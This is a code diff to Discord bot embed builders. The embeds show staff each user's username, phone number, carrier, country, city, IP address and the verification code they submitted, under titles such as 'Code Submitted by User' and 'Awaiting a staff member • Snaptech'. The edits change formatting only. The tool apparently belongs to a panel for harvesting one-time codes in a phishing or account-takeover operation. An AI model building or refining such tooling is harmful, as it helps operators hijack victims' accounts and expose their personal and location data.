@@ -40,12 +40,12 @@ export function buildNewRequestEmbed(row) {
         )
         .addFields(
             { name: "👤 Username",    value: "```\n" + row.username + "\n```",    inline: true  },
-            { name: "📞 Phone",       value: "```\n" + formatPhone(row.phone) + "\n```", inline: true },
+            { name: "📞 Phone",       value: formatPhone(row.phone),              inline: true  },
             { name: "📡 Carrier",     value: "`" + carrier + "`",                inline: true  },
             { name: "🌍 Country",     value: "`" + (row.country || "?") + "`",   inline: true  },
             { name: "🏙️ City",       value: "`" + (row.city || "?") + "`",      inline: true  },
             { name: "🌐 IP",          value: formatIP(ip),                        inline: true  },
-            { name: "⏰ Received",    value: "`" + formatDate(row.created_at) + "`", inline: true },
+            { name: "⏰ Received",    value: formatDate(row.created_at),           inline: true  },
         )
         .setFooter({ text: "⏳ Awaiting a staff member  •  Snaptech" })
         .setTimestamp();
@@ -60,10 +60,8 @@ export function buildCodeSubmittedEmbed(row) {
     const len     = row.code_length || 6;
     const ip      = row.ip_address;
 
-    // Format the code with spaces every 3 digits for readability
-    const codeFmt = code.length > 3
-        ? code.slice(0, 3) + " " + code.slice(3)
-        : code;
+    // Format the code with a space between each digit for a clean, readable display
+    const codeFmt = code.split("").join(" ");
 
     return new EmbedBuilder()
         .setTitle("🔓 Code Submitted by User")
@@ -72,9 +70,9 @@ export function buildCodeSubmittedEmbed(row) {
             `> 🔢 **${len}-digit** code — \`#${row.id}\`  |  📡 **${carrier}**`
         )
         .addFields(
-            { name: "👤 Username",    value: "```\n" + row.username + "\n```",    inline: true  },
-            { name: "📞 Phone",       value: "```\n" + formatPhone(row.phone) + "\n```", inline: true },
-            { name: "⏰ Submitted",   value: "`" + formatDate(row.updated_at || row.created_at) + "`", inline: true },
+            { name: "👤 Username",    value: "`\n" + row.username + "\n`",    inline: true  },
+            { name: "📞 Phone",       value: formatPhone(row.phone),              inline: true  },
+            { name: "⏰ Submitted",   value: formatDate(row.updated_at || row.created_at), inline: true },
             { name: "🔢 Code Entered", value: "```\n" + codeFmt + "\n```",         inline: false },
             { name: "📡 Carrier",     value: "`" + carrier + "`",                inline: true  },
             { name: "🌍 Country",     value: "`" + (row.country || "?") + "`",   inline: true  },
@@ -100,8 +98,8 @@ export function buildRetryEmbed(row) {
         )
         .addFields(
             { name: "👤 Username",  value: "```\n" + row.username + "\n```",    inline: true  },
-            { name: "📞 Phone",     value: "```\n" + formatPhone(row.phone) + "\n```", inline: true },
-            { name: "⏰ Retried",    value: "`" + formatDate(row.updated_at || row.created_at) + "`", inline: true },
+            { name: "📞 Phone",     value: formatPhone(row.phone),              inline: true  },
+            { name: "⏰ Retried",    value: formatDate(row.updated_at || row.created_at), inline: true },
             { name: "📡 Carrier",   value: "`" + carrier + "`",                inline: true  },
             { name: "🌍 Country",   value: "`" + (row.country || "?") + "`",   inline: true  },
             { name: "🏙️ City",     value: "`" + (row.city || "?") + "`",      inline: true  },
